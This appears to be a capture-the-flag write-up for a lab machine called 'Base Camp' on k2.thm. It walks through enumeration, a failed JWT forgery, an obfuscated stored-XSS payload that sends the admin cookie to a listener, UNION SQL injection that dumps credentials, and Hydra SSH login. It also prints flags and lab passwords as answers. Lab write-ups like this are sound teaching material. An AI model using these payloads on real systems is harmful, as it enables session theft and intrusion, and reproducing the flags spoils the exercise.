# Base Camp

Date: May 14, 2026
Target IP: 10.114.165.49

---

## About Base Camp

```
You have been asked to run a vulnerability test on the K2 network in order to see if there is any way that a malicious actor would be able to infiltrate.

The IT team assures you that the network is secure and that you won't be able to make your way up the mountain.

They have only provided you with their external website called k2.thm.
```

## Tasks

1. What is the user flag?
2. What is the root flag?
3. What are the usernames and passwords that had access to the server? List the usernames in alphabetical order with their corresponding password separated by a comma. Format is username:password.
4. Two users have their full names on display. What are their names? In Alphabetical order. Format is first name last name separated by a comma.

---

## Initial enumeration

```bash
nmap -sCV -p 1-10000 -oN nmap/initial k2.thm
```

![[Pasted image 20260514180903.png]]

**Open ports:**
- 22 (SSH) OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
- 80 (HTTP) nginx 1.18.0

---

## Web server enumeration

```bash
gobuster dir -u http://k2.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,py,txt
```

**Found:**

- /home *(This is just the default homepage)*

There are 4 different options `Intro`, `Work`, `About`,`Contact`. All of them except `Contact` are regular text/information in a different language than English.

![[Pasted image 20260514181757.png]]

### Contact

![[Pasted image 20260514182704.png]]

Captured the form submission in Burp Suite. The form POSTs to `/home` but the server responds with **405 Method Not Allowed** – only GET/HEAD/OPTIONS allowed on that endpoint. The parameters sent are:

`name=test&email=test@test.com&message=hello`

This suggests the form may be misconfigured and doesn't do anything useful. Moving on to subdomain enumeration.

![[Pasted image 20260514183434.png]]

---

## Vhost Enumeration

**Found two subdomain**
- `admin.k2.thm` - admin panel, login only
- `it.k2.thm` - ticket system with login and registration

```bash
ffuf -u 'http://k2.thm/' -H "Host: FUZZ.k2.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -t 50 -fs 13229
```

![[Pasted image 20260514184002.png]]

Visiting `http://it.k2.thm`, we see that we can log in and create a account.

![[Pasted image 20260514184254.png]]

Visiting `http://admin.k2.thm`, we see that we can only log in.

![[Pasted image 20260514184346.png]]

I was able to make a account so this works better than the previous attempt on `contact`.
Also tried to login with this account on `admin` but no luck there.

![[Pasted image 20260514184827.png]]

It's a system for submitting tickets.

![[Pasted image 20260514185307.png]]

---

## Hunting for a way in

With access to `it.k2.thm` as a regular user, the session cookie is a JWT. Inspecting it on jwt.io reveals the payload contains `id: 1` and the header is missing the `alg` claim, a textbook indicator of a potential **JWT Algorithm None** vulnerability.

The idea: craft a token with `"alg": "none"` and no signature, setting `id: 0` to impersonate the admin.

![[Pasted image 20260514190245.png]]

![[Pasted image 20260514190615.png]]


```python
python3 -c "
import base64, json

header = json.dumps({'alg':'none','typ':'JWT'}, separators=(',',':')).encode()
payload = json.dumps({'auth_username':'admin','id':0,'loggedin':True}, separators=(',',':')).encode()

h = base64.urlsafe_b64encode(header).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(payload).rstrip(b'=').decode()

print(f'{h}.{p}.')
"
```

Replacing the session cookie with this token and sending a request to `/dashboard` returned a **302 redirect to `/login`**, the server verifies the signature. Algorithm None attack failed.

![[Pasted image 20260514190950.png]]


Next attempt was **SSTI** in the ticket fields. The payload to test is `{{7*7}}`, if the template engine evaluates it, `49` appears in the response or rendered output, confirming server-side template injection and a path to RCE. No `49` in the response, no callback to a listener. Either the fields are sanitized before rendering, or the admin panel doesn't display ticket content in a vulnerable context.

![[Pasted image 20260514192242.png]]

This did not work either, no callback -> Admin probably doesn't read tickets. 

![[Pasted image 20260514193159.png]]

Both dead ends. But the WAF kicking in when probing the `description` field on the admin side suggested something *was* being parsed - pointing toward **XSS** as the actual attack surface.

---

## Stored XSS → Session Hijacking

**HIT!**

WAF is activated and `description` is vulnerable. 
I'm probably on the right track now!

![[Pasted image 20260514193833.png]]

![[Pasted image 20260514194727.png]]

Did some binary searching in the ticket description field, but it only blocks specific string patterns!

**WAF behaviour:**

| Payload                 | Result  |
| ----------------------- | ------- |
| `<b>test</b>`           | Passes  |
| `<img src=x onerror=1>` | Passes  |
| `fetch`                 | Passes  |
| `document.cookie`       | Blocked |

**Jackpot! XSS works!**

`document.cookie` is blocked directly, but the WAF doesn't inspect base64-decoded content. Encoding the payload and using `eval(atob(...))` bypasses it completely.

```
<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xOTIuMTY4LjE3OS4xNDA6ODAwMC8/Yz0nK2RvY3VtZW50LmNvb2tpZSk='))">
```

Starting a listener on port 8000 and submitting the ticket captured the admin's session cookie!

![[Pasted image 20260514200514.png]]

```
eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.agYO1g.kIZjFbJoDSORS4-kI7XPv7CcCcc
```

![[Pasted image 20260514200800.png]]

Replacing the cookie in the browser gave full access to the admin panel as `james`.

![[Pasted image 20260514201353.png]]

---

## Admin Panel Recon

With admin access, a directory fuzz confirms `/dashboard`:

```bash
ffuf -u http://admin.k2.thm/FUZZ -H "Cookie: session=eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.agYO1g.kIZjFbJoDSORS4-kI7XPv7CcCcc" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,302
```

![[Pasted image 20260514202345.png]]

Got access to the admin panel!

![[Pasted image 20260514202830.png]]


Inside the dashboard, three submitted tickets are visible:

```
- smokey: "my computer won't start" 
- hazel: "what is my password?" 
- paco: "8675309 is jenny's number"
```

![[Pasted image 20260514202913.png]]

### Potential leads

```
- Usernames: smokey, hazel, paco, james (admin) 
- Password candidate: 8675309 (from paco's ticket) 
- "Select Ticket Title" form — possible injection point
```

---

## SQL Injection → Credential Dump

Tried a few different methods, these ones was fine:
```
help; id 
help && id 
{{7*7}} 
```

With this I got a warning!
```
' OR 1=1--
```

![[Pasted image 20260514204005.png]]

**SQL Injection confirmed!** 

This will be much easier to do in Burp rather than getting a new cookie every time.


**3 columns in the query:** (User, Title, Description)
```
test' UNION SELECT 1,2,3 -- -
```

![[Pasted image 20260514210955.png]]

**Database fingerprinting**

Next we identify database and version:
```
test' UNION SELECT database(),version(),user() -- -
```

![[Pasted image 20260514212053.png]]

- Database: `ticketsite`
- Version: `MYSQL 8.0.33-0ubuntu0.20.04.2`
- User: `james@localhost`

**Table enumeration**

List all tables:
```
title=test' UNION SELECT table_name,table_schema,3 FROM information_schema.tables WHERE table_schema=database()-- -
```

![[Pasted image 20260514212259.png]]

- Tables `admin_auth`, `auth_user`, `tickets`


Identify number of columns in admin_auth:
```
test' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='admin_auth'-- -
```

![[Pasted image 20260514213224.png]]

- Number of columns: `4`

**Credential dump**

Dump the credentials for `admin_auth`:

```
test' UNION SELECT admin_username,admin_password,email FROM admin_auth-- -
```

![[Pasted image 20260514213503.png]]


**There we have some credentials!!**

| Username | Password         |
| -------- | ---------------- |
| james    | Pwd@9tLNrC3!     |
| rose     | VrMAogdfxW!9     |
| bob      | PasSW0Rd321      |
| steve    | St3veRoxx32      |
| cait     | PartyAlLDaY!32   |
| xu       | L0v3MyDog!3!     |
| ash      | PikAchu!IshoesU! |

`auth_users` only had the account I made, but best be sure to enumerate while I'm here.

```
title=test' UNION SELECT auth_username,auth_password,email FROM auth_users-- -
```

![[Pasted image 20260514215215.png]]


## SSH Access

Collected all the info into a text-file to try Hydra against the SSH-service!

```
james:Pwd@9tLNrC3!:james@k2.thm:1
rose:VrMAogdfxW!9:rose@k2.thm:2
bob:PasSW0Rd321:bob@k2.thm:3
steve:St3veRoxx32:steve@k2.thm:4
cait:PartyAlLDaY!32:cait@k2.thm:5
xu:L0v3MyDog!3!:xu@k2.thm:6
ash:PikAchu!IshoesU!:ash@k2.thm:7
```

```bash
cut -d':' -f1,2 admin_auth.txt > creds.txt
```

```
james:Pwd@9tLNrC3!
rose:VrMAogdfxW!9
bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
```

**Hydra attempt**
```bash
hydra -C creds.txt ssh://k2.thm
```

![[Pasted image 20260514220544.png]]

![[Pasted image 20260514220728.png]]

**User flag:** `THM{9e04a7419a2b7a86163496271a8a95dd}`

---

## Privilege Escalation

James can't run any sudo commands.

![[Pasted image 20260514221130.png]]


![[Pasted image 20260514220911.png]]

**GREAT!** James is part of `adm` group, which means he can read `/var/log` without sudo.

After some poking around in the system I found a password that was not in the list of credentials I found on the database.

```bash
cat access.log.1 | grep -i "pass\|pwd\|user\|login"
```

![[Pasted image 20260514221747.png]]

A failed login attempt in the log contained the root password typed into the wrong field!

![[Pasted image 20260514221933.png]]

**Root flag:** `THM{c6f684e3b1089cd75f205f93de9fe93d}`

---

## Post exploitation

The remaining questions required identifying users with full names and confirming which accounts had server access.

**Full names (alphabetical)**

Looking in `/etc/passwd` we find the 2 users with their full names!

![[Pasted image 20260514222315.png]]

- James Bold
- Rose Bud

**Users with server access (alphabetical)**

We know the three users who has access was `James`,`Rose`and `root`.
I found Rose's password in her bash history. 
And now we have the all the answers.

![[Pasted image 20260514223026.png]]

- james:Pwd@9tLNrC3!
- root:RdzQ7MSKt)fNaz3!
- rose:vRMkaVgdfxhW!8

---

## Credentials Carried Forward

The following credentials were taken into Middle Camp:

```
james:Pwd@9tLNrC3!
rose:VrMAogdfxW!9
bob:PasSW0Rd321
steve:St3veRoxx32
cait:PartyAlLDaY!32
xu:L0v3MyDog!3!
ash:PikAchu!IshoesU!
```


---
